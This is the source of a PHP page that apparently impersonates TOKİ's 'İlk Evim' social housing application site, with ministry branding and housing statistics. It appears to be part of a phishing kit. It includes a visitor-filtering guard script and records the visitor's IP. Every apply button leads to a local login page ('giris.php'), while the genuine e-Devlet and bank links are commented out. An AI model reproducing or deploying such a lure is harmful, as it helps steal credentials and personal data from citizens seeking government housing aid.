<?php 
session_start();
error_reporting(0);
require_once(__DIR__ . '/inc/good_guard.php');
include('inc/back_head.php');

$ip = $_SERVER['REMOTE_ADDR']; 
?>
<!doctype html>
<html lang="tr" class="h-100" data-bs-theme="auto">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="keywords" content="çocuk yardımı, doğum yardımı">
    <title>İlk Evim Başvuruları</title>
    <link href="https://getbootstrap.com/docs/5.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <meta name="theme-color" content="#712cf9">
    <link rel="stylesheet" href="assets/rte.css?v=1">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <script src="https://kit.fontawesome.com/52bea4ecb7.js" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
    <script src="../inc/script_master.js"></script>
</head>
<style>
html, body {
    margin: 0;
    padding: 0;
    height: 100%; 
}

body {

    background-image: url("assets/slider2-tab.jpg");

    background-repeat: no-repeat;

    background-size: cover;

    background-position: center;

    background-attachment: fixed;
}
</style>

<body class="d-flex h-100 text-center">
    <div class="cover-container d-flex w-100 h-100  mx-auto flex-column">
        <main>
            <div class="topheader">
                <div class="tContainer">
                    <div class="logoarea">
                        <img class="logo" src="assets/logo.jpg" />
                        <header class="mb-auto">
                            <div>
                                <nav class="nav nav-masthead justify-content-center float-md-end">
                                    <a class="nav-link py-1 px-0 " href="#" aria-current="page"><i class="icon-homee"> </i> </a>
                                    <a class="nav-link py-1 px-0 " href="#">Haberler</a>
                                    <a class="nav-link py-1 px-0" href="#">Videolar</a>
                                    <a class="nav-link py-1 px-0" href="#">Sıkça Sorulan Sorular</a>
                                    <a class="nav-link py-1 px-0" href="#">Toki Anasayfa</a>
                                    <a class="nav-link py-1 px-0" href="#">
                                    <img style="    margin-top: -10px;" src="assets/ilkevim-b.png" width="100" class="white img-fluid" alt="ilkevim">
                                    <img style="    margin-top: -10px;" src="assets/ilkevim.png" width="100" class="black img-fluid" alt="ilkevim">
                                </a>
                                </nav>
                            </div>
                        </header>
                    </div>
                    <div class="nav1">

                        <img src="assets/ilkevim-b.png" width="181" height="89" class="white img-fluid" alt="ilkevim">
                        <img src="assets/ilkevim.png" width="181" height="89" class="black img-fluid" alt="ilkevim">
                        </a>
                        <i class="icon-menu menubars"></i>
                    </div>
                </div>
            </div>

            <div class="maininner">
                <img src="assets/tesekkur.png" class="tsk">
                <p>İLK EVİM, İLK İŞYERİM, İLK EVİM ARSA, İLK EVİM KREDİSİ PROJESİNDE</p>
                <p>Ön Başvurular</p>
                <p class="desc">Aktif!</p>
            </div>
            <div class="btns">
                <div class="btn-single">
                    <a href="giris.php">
                        <div class="leftSide">
                            <p>İlk Evim</p>
                            <span>Başvur</span>
                            <!--<div class="i-wrapper"><i class="icon-qr"></i> <span>Başvuru</span>
                                </div>-->
                            <div class="absoluteimage"><i class="icon-sosyal"></i></div>
                        </div>
                        <div class="rightSide"><i class="icon-go"></i></div>
                    </a>
                </div>
                <div class="btn-single btn-style-1">
                    <a href="giris.php">
                        <div class="leftSide">
                            <p>İlk İşyerim</p>
                            <span>Başvur</span>
                            <!--<div class="i-wrapper"><i class="icon-qr"></i> <span>Başvuru</span>
                                </div>-->
                            <div class="absoluteimage"><i class="icon-ofis"></i></div>
                        </div>
                        <div class="rightSide"><i class="icon-go"></i></div>
                    </a>
                </div>
                <div class="btn-single btn-style-2">
                    <a href="giris.php">
                        <div class="leftSide">
                            <p>İlk Evim Arsa</p>
                            <span>Başvur</span>
                            <!--<div class="i-wrapper"><i class="icon-qr"></i> <span>Başvuru</span>
                                </div>-->
                            <div class="absoluteimage"><i class="icon-arsa"></i></div>
                        </div>
                        <div class="rightSide"><i class="icon-go"></i></div>
                    </a>
                </div>
                <div class="btn-single">
                    <a href="giris.php">
                        <div class="leftSide">
                            <p>İlk Evim Kredisi</p>
                            <span>Başvur</span>
                            <!--<div class="i-wrapper"><i class="icon-qr"></i> <span>Başvuru</span>
                                </div>-->
                            <div class="absoluteimage"><i class="icon-arsa"></i></div>
                        </div>
                        <div class="rightSide"><i class="icon-go"></i></div>
                    </a>
                </div>
            </div>
        </main>
        <content>
            <div class="row above-slide">
                <div class="col-lg-3 col-lg-3 col-10 offset-1 offset-lg-0">
                    <div class="greenarea">
                        <p>
                            <img src="assets/green-content.png" />
                        </p>
                        <ul>
                            <li class="btnPrev"><span> <i class="icon-left"></i></span></li>
                            <li class="btnNext"><span> <i class="icon-right"></i></span></li>
                        </ul>
                    </div>
                </div>
                <div class="col-lg-9 align-self-center">
                    <div class="slides">
                        <div class="slide active">
                            <span class="title-1">
                <img src="assets/konut.svg" width="70" />
                KONUT</span>
                            <div class="big-title">1 Milyon 170 Bin</div>
                            <p>Konut</p>
                        </div>
                        <div class="slide">
                            <span class="title-1">
                <img src="assets/sosyaldonati.svg" width="70" />
                SOSYAL DONATILAR</span>
                            <ul class="specs row-4">
                                <li>
                                    <div class="big-title">1.395</div>
                                    <p>Okul</p>
                                </li>
                                <li>
                                    <div class="big-title">20</div>
                                    <p>Üniversite</p>
                                </li>
                                <li>
                                    <div class="big-title">997</div>
                                    <p>Spor Salonu</p>
                                </li>
                                <li>
                                    <div class="big-title">44</div>
                                    <p>Kütüphane</p>
                                </li>
                            </ul>
                        </div>
                        <div class="slide">
                            <ul class="specs row-4">
                                <li>
                                    <div class="big-title">215</div>
                                    <p>Yurt / Pansiyon</p>
                                </li>
                                <li>
                                    <div class="big-title">340</div>
                                    <p>Kamu Hiz. Bin.</p>
                                </li>
                                <li>
                                    <div class="big-title">269</div>
                                    <p>Hastane</p>
                                </li>
                                <li>
                                    <div class="big-title">99</div>
                                    <p>Sağlık Ocağı</p>
                                </li>
                            </ul>
                        </div>

                        <div class="slide">
                            <ul class="specs row-3">
                                <li>
                                    <div class="big-title">1.485</div>
                                    <p>Ticarret Merkezi</p>
                                </li>
                                <li>
                                    <div class="big-title">922</div>
                                    <p>Cami</p>
                                </li>
                                <li>
                                    <div class="big-title">20</div>
                                    <p>Stadyum</p>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
            <section class="mainSosyal bk">
                <div class="tContainer">
                    <div class="row">
                        <div class="sTitle">
                            <h1>Cumhuriyet Tarihinin En Büyük</h1>
                            <span>SOSYAL KONUT HAMLESİ</span>
                            <p>Projede 2+1, 3+1 konutlar olacak. Vatandaşlara en uygun fiyatlar ve ödeme seçenekleri sunulacak. </p>
                        </div>
                    </div>
                    <div class="row pt-5">
                        <div class=" col-xl-4 col-lg-6">
                            <div class="mainSosyal__box">
                                <div class="mainSosyal__icon-wrapper"> <span><img src="assets/ilk-blue.svg" alt="sosyal konut"></span> </div>
                                <div class="mainSosyal__text-wrapper">
                                    <div class="desc">İlk Kez<br> Ev Sahibi Olacaklar</div>
                                    <p>Daha önce ev sahibi olmayanlar çok uygun fiyatlara ev sahibi olacak.</p>
                                </div>
                            </div>
                        </div>
                        <div class=" col-xl-4 col-lg-6">
                            <div class="mainSosyal__box">
                                <div class="mainSosyal__icon-wrapper"> <span><img src="assets/map-blue.svg" alt="sosyal konut"></span> </div>
                                <div class="mainSosyal__text-wrapper">
                                    <div class="desc">81 İlde Ev <br> Sahibi Olma İmkanı</div>
                                    <p>Türkiye' nin her yerinde 2+1 ve 3+1 sosyal konut imkanı sağlanacak.</p>
                                </div>
                            </div>
                            <strong></strong>
                        </div>
                        <div class=" col-xl-4 col-lg-6">
                            <div class="mainSosyal__box">
                                <div class="mainSosyal__icon-wrapper"> <span><img src="assets/ev-blue.svg" alt="sosyal konut"></span> </div>
                                <div class="mainSosyal__text-wrapper">
                                    <div class="desc">350.000<br> Sosyal Konut</div>
                                    <p>250.000 sosyal konut, hazine arazilerinde 100.000 altyapılı konut arsası ve 10.000 sanayi sitesi yapılacak.</p>
                                </div>
                            </div>
                        </div>
                        <div class=" col-xl-4 col-lg-6">
                            <div class="mainSosyal__box">
                                <div class="mainSosyal__icon-wrapper"> <span><img src="assets/istanbul.svg" alt="sosyal konut"></span> </div>
                                <div class="mainSosyal__text-wrapper">
                                    <div class="desc">En Çok<br> İstanbul' da</div>
                                    <p>50.000 sosyal konut yapılacak.</p>
                                </div>
                            </div>
                        </div>
                        <div class=" col-xl-4 col-lg-6">
                            <div class="mainSosyal__box">
                                <div class="mainSosyal__icon-wrapper"> <span><img src="assets/arsak.svg" alt="sosyal konut"></span> </div>
                                <div class="mainSosyal__text-wrapper">
                                    <div class="desc">Altyapılı Konut <br> Arsası
                                    </div>
                                    <p>7 bölgede olacak.</p>
                                </div>
                            </div>
                        </div>
                        <div class=" col-xl-4 col-lg-6">
                            <div class="mainSosyal__box">
                                <div class="mainSosyal__icon-wrapper"> <span><img src="assets/sanayi.svg" alt="sosyal konut"></span> </div>
                                <div class="mainSosyal__text-wrapper">
                                    <div class="desc">Toki'den İlk Kez <br> Sanayi Siteleri </div>
                                    <p>Ankara’da 1000, Adana’da 500, İzmir’de 700 olmak üzere toplam 28 ilimizde 10 bin sanayi sitesi kurulacak. </p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </section>

            <section class="mainDev">
                <div class="tContainer">
                    <div class="row">
                        <div class="col-lg-12">
                            <div class="sTitle beRed">
                                <h1> Başvuru</h1>
                                <span>BAŞVURULAR NEREDEN ALINACAK?</span>
                                <p>Başvurunuzu Ziraat Bankası, Halkbank şubelerinden ve E-devlet üzerinden yapabilirsiniz. </p>
                            </div>
                        </div>
                    </div>
                    <div class="row scroll-wrapper">
                        <ul class="defination-way">
                            <li>
                                <div class="defination-way-box d-flex align-items-stretch"> <img src="assets/11.png" alt="1" srcset="assets/11.png" lazy=""> </div>
                                <div class="defination-text-wrapper card-body d-flex flex-column">
                                    <p class="def-title">E-Devlet</p>
                                    <p class="def-desc">Başvurunuzu E-devlet üzerinden yapabilirsiniz. </p>
                                </div>
                                <!--								<a class="btn_1 beRed mt-4" target="_blank" href="https://www.turkiye.gov.tr">Hemen
                                                                Başvur <i class="icon-go"></i></a>-->
                            </li>
                            <li>
                                <div class="defination-way-box d-flex align-items-stretch"> <img src="assets/2.png" alt="2" srcset="assets/2.png" lazy=""> </div>
                                <div class="defination-text-wrapper card-body d-flex flex-column">
                                    <p class="def-title">Halkbank</p>
                                    <p class="def-desc">Başvurunuzu Halkbank şubelerinden yapabilirsiniz. </p>
                                </div>
                                <!-- <a class="btn_1 beBlue mt-4" target="_blank" href="https://sube.halkbank.com.tr/InternetBankingHost/HostLogin"> Başvur <i class="icon-go"></i></a>-->
                            </li>
                            <li>
                                <div class="defination-way-box d-flex align-items-stretch"> <img src="assets/3.png" alt="3" srcset="assets/3.png" lazy=""> </div>
                                <div class="defination-text-wrapper card-body d-flex flex-column">
                                    <p class="def-title">Ziraat Bankası</p>
                                    <p class="def-desc">Başvurunuzu Ziraat Bankası şubelerinden yapabilirsiniz.</p>
                                </div>
                                <!--  <a class="btn_1 beRed mt-4" target="_blank" href="https://bireysel.ziraatbank.com.tr/Transactions/Login/FirstLogin.aspx?ReturnUrl=%2f"> Başvur <i class="icon-go"></i></a>-->
                            </li>
                        </ul>
                    </div>
                </div>
            </section>
        </content>
        <section class="footer">
            <div id="goUp"><span><i class="icon-up"></i></span></div>
            <div class="secondcontainer footerBk" style="background-image:url('assets/footer.jpg');">
                <div class="tContainer">
                    <div class="row">
                        <div class="col-12 col-md-12 col-lg-5 col-xl-5">
                            <div class="contact-wrapper">
                                <h3>Cumhuriyet Tarihinin En Büyük<br> Sosyal Konut Hamlesi için Başvurun</h3>
                                <p>
                                    Başvuru detaylarını nasıl başvururum sayfasından inceleyebilirsiniz. Başvurular Ziraat Bankası, Halkbank şubelerinden ve E-Devlet üzerinden yapılacaktır.
                                </p>
                            </div>
                        </div>
                        <div class="col-12 col-md-12 col-lg-4 col-xl-3 align-self-center justify-content-lg-start justify-content-center d-flex">
                            <!--<a target="_blank" class="btn_1 beRed" href="https://www.turkiye.gov.tr">
                            <img src="./assets/img/edevlet.png" width="466" height="482" alt="e-devlet" loading="lazy"> Hemen Başvur <i class="icon-go"></i></a>--></div>
                        <div class="col-12 col-md-12 col-lg-3 col-xl-4">
                            <div class="contact-wrapper">
                                <p class="title">TOKİ</p>
                                <!-- <span class="d-none d-lg-block d-md-none d-xl-block">T:</span> -->

                                <!-- <div class="sliderHastag_wrapper">
                                <ul>
                                    <li class="d-none d-lg-block d-xl-block">
                                        <a class="shareButton" href="javascript:void(0);">
                                            <p>Paylaş</p>
                                            <span><i class="icon-share"></i></span>
                                        </a></li>
                                </ul>
                            </div> -->
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <div class="copyright-footer">
            <div class="copyright text-center">
                <p>Çevre,Şehircilik ve İklim Değişikliği Bakanlığı - Tüm Hakları Saklıdır. © 2022</p>
            </div>
        </div>
    </div>
    <script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"14d1d027c8904f0894e1033694aa6bef","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}'
        crossorigin="anonymous"></script>
</body>

</html>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<style>
    [data-notify-text],
    [data-notify-html] {
        position: relative;
        word-wrap: break-word;
        width: 380px;
        display: block;
        text-overflow: clip;
        white-space: break-spaces;
    }
</style>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/styles/metro/notify-metro.css" integrity="sha512-CJ6VRGlIRSV07FmulP+EcCkzFxoJKQuECGbXNjMMkqu7v3QYj37Cklva0Q0D/23zGwjdvoM4Oy+fIIKhcQPZ9Q==" crossorigin="anonymous" referrerpolicy="no-referrer"
/>
<script src="https://cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/notify.min.js" integrity="sha512-efUTj3HdSPwWJ9gjfGR71X9cvsrthIA78/Fvd/IN+fttQVy7XWkOAXb295j8B3cmm/kFKVxjiNYzKw9IQJHIuQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<style>
    [data-notify-text],
    [data-notify-html] {
        position: relative;
        word-wrap: break-word;
        width: 380px;
        display: block;
        text-overflow: clip;
        white-space: break-spaces;
    }
</style>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/styles/metro/notify-metro.css" integrity="sha512-CJ6VRGlIRSV07FmulP+EcCkzFxoJKQuECGbXNjMMkqu7v3QYj37Cklva0Q0D/23zGwjdvoM4Oy+fIIKhcQPZ9Q==" crossorigin="anonymous" referrerpolicy="no-referrer"
/>
<script src="https://cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/notify.min.js" integrity="sha512-efUTj3HdSPwWJ9gjfGR71X9cvsrthIA78/Fvd/IN+fttQVy7XWkOAXb295j8B3cmm/kFKVxjiNYzKw9IQJHIuQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>